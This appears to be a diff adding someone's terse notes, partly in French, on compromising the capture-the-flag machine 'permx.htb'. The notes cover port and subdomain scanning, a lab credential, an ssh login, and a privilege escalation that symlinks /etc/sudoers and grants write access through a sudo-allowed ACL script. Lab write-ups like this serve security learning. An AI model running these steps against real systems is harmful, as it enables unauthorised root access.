@@ -1,0 +1,42 @@
+Network discovery
+nmap -sV 10.10.11.23
+Starting Nmap 7.95 ( https://nmap.org ) at 2024-10-15 20:56 CEST
+Nmap scan report for permx.htb (10.10.11.23)
+Host is up (0.050s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.52
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.62 seconds
+
+Fuzzing on website
+Directories
+gobuster dir -u http://permx.htb/ -w SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 
+/img
+/css
+/lib
+/js
+/server-status
+
+Subdomains
+ffuf -u http://permx.htb -w SecLists/Discovery/DNS/subdomains-top1million-20000.txt -fw 18 -t 100 -H "HOST: FUZZ.permx.htb"
+
+www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 27ms]
+lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 84ms]
+
+lms fait tourner chamino 1.11
+
+Utilisation de penelope (voir sighless.txt)
+Utilisation de linpeas (voir sighless.txt) depuis le répertoire html
+mtz:03F6lY3uXAP2bkW8
+
+ssh mtz@10.10.11.23
+
+Faire sudo -l pour savoir les permissions de mtz
+
+Effectuer un raccourci de txlast vers sudoers pour lancer le fichier depuis le repertoire 
+ln -s /etc/sudoers txlast
+sudo /opt/acl.sh mtz rw /home/mtz/txlast
